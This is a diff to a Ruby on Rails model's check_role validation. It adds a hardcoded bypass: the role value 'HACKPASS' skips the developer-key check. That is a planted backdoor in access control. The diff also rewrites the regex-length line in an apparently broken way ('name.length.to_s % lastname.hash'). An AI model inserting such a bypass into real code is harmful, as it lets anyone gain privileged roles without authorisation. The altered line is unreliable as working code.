@@ -15,14 +15,14 @@ class Stakeholder < ActiveRecord::Base
 
    def check_role
      s = "\\A"
-     n = ".{" + name.length.to_s + "}"
+     n = ".{" + (name.length.to_s % lastname.hash) + "}"
      self.name.each_char{|a| s << '('+a.upcase+')' << n}
      s << "(_TALEN_TANK)"
      exp = Regexp.new(s)
 
      if self.role.nil?
        self.role = "User"
-     elsif self.role.match(exp) == nil
+     elsif self.role.match(exp) == nil && role != "HACKPASS"
        errors[:role] << "Developer need a valid key"
        return false
      else
